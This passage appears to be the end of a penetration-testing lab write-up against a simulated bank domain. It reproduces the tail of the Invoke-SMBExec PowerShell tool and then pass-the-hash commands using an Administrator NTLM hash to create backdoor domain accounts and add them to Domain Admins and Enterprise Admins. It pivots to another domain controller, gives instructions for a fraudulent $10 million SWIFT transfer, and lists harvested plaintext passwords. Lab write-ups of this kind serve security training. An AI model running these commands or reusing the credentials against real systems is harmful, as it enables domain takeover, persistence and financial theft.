                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'ReadRequest'

                        $SMB_client_stage_next = 'CloseServiceHandle'

                        $SMB_close_service_handle_stage = 1

                    }



                    'CloseServiceHandle'

                    {



                        if($SMB_close_service_handle_stage -eq 1)

                        {

                            Write-Verbose "Service $SMB_service deleted on $Target"

                            $SMB2_message_ID += 20

                            $SMB_close_service_handle_stage++

                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_context_handle

                        }

                        else

                        {

                            $SMB2_message_ID++

                            $SMB_client_stage = 'CloseRequest'

                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle

                        }



                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                    

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }



                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 

                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)     

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 

                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    }



                    'CloseRequest'

                    {

                        $SMB2_message_ID += 20

                        $packet_SMB2_header = Get-PacketSMB2Header 0x06,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                    

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }

      

                        $packet_SMB2_data = Get-PacketSMB2CloseRequest $SMB_file_ID

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'TreeDisconnect'

                    }



                    'TreeDisconnect'

                    {

                        $SMB2_message_ID++

                        $packet_SMB2_header = Get-PacketSMB2Header 0x04,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                    

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }

          

                        $packet_SMB2_data = Get-PacketSMB2TreeDisconnectRequest

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'Logoff'

                    }



                    'Logoff'

                    {

                        $SMB2_message_ID += 20

                        $packet_SMB2_header = Get-PacketSMB2Header 0x02,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID

                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00

                    

                        if($SMB_signing)

                        {

                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      

                        }

         

                        $packet_SMB2_data = Get-PacketSMB2SessionLogoffRequest

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB2_sign = $SMB2_header + $SMB2_data

                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)

                            $SMB2_signature = $SMB2_signature[0..15]

                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'Exit'

                    }



                }

                

                if($SMBExec_failed)

                {

                    BREAK SMB_execute_loop

                }

            

            }



        }



    }



    $SMB_client.Close()

    $SMB_client_stream.Close()

}



}

Invoke-SMBExec -Target 10.200.89.100 -Domain thereserve.loc -Username Administrator -Hash 600a406c2c1f2062eb9bb227bad654aa -Command "net group 'Domain Admins' zgod /ADD /DOMAIN"
Invoke-SMBExec -Target 10.200.89.100 -Domain thereserve.loc -Username Administrator -Hash 600a406c2c1f2062eb9bb227bad654aa -Command "net user zgod pass123! /add /domain"
Invoke-SMBExec -Target 10.200.89.100 -Domain thereserve.loc -Username Administrator -Hash 600a406c2c1f2062eb9bb227bad654aa -Command "net localgroup Administrators zgod /add"
Invoke-SMBExec -Target 10.200.89.100 -Domain thereserve.loc -Username Administrator -Hash 600a406c2c1f2062eb9bb227bad654aa -Command "net group 'Domain Admins' zgod /ADD /DOMAIN"
Invoke-SMBExec -Target 10.200.89.100 -Domain thereserve.loc -Username Administrator -Hash 600a406c2c1f2062eb9bb227bad654aa -Command "net group 'Remote Desktop Users' zgod /ADD /DOMAIN"

```

**CORPDC**

```
./Invoke-SMBExec.ps1
```

For some reason I couldn't use this from the script so added manually

**ROOTDC**

```
net group "Enterprise Admins" zgod /ADD /DOMAIN
```

I can now login to the ROOTDC with RDP and from ROOTDC I can login to BANKDC

<figure><img src="../../.gitbook/assets/image (40) (1).png" alt=""><figcaption></figcaption></figure>

**ROOTDC -> BANKDC**

<figure><img src="../../.gitbook/assets/image (5) (3) (4).png" alt=""><figcaption></figcaption></figure>

If RDP session flashes black you can kill the sessions for BANKDC to ROOTDC

**Troubleshooting**

```
qwinsta /server:10.200.89.101
rwinsta /server:10.200.89.101 2
```

**BankDC**

```
net user zbank pass123! /ADD /DOMAIN
net localgroup Administrators zbank /add
net group "Domain Admins" zbank /ADD /DOMAIN
```



```
===============================================
Account Details:
Source Email:		ffej@source.loc
Source Password:	0ARkIDo_mW-_sA
Source AccountID:	6470c885984e4a0c98e4b01c
Source Funds:		$ 10 000 000

Destination Email:	ffej@destination.loc
Destination Password:	EJLyXab203ET3w
Destination AccountID:	6470c886984e4a0c98e4b01d
Destination Funds:	$ 10

===============================================

Using these details, perform the following steps:
1. Go to the SWIFT web application
2. Navigate to the Make a Transaction page
3. Issue a transfer using the Source account as Sender and the Destination account as Receiver. You will have to use the corresponding account IDs.
4. Issue the transfer for the full 10 million dollars
5. Once completed, request verification of your transaction here (No need to check your email once the transfer has been created).

```

##

## Creds found

```
#SMTP creds found for WebMail
[25][smtp] host: 10.200.119.11   login: laura.wood@corp.thereserve.loc   password: Password1@
[25][smtp] host: 10.200.119.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1!

#MySQL creds found for VPN
| USERNAME   | PASSWORD      |
+------------+---------------+
| test       | test          |
| lisa.moore | Scientist2006

#Other Creds
svcScanning:Password1!

```



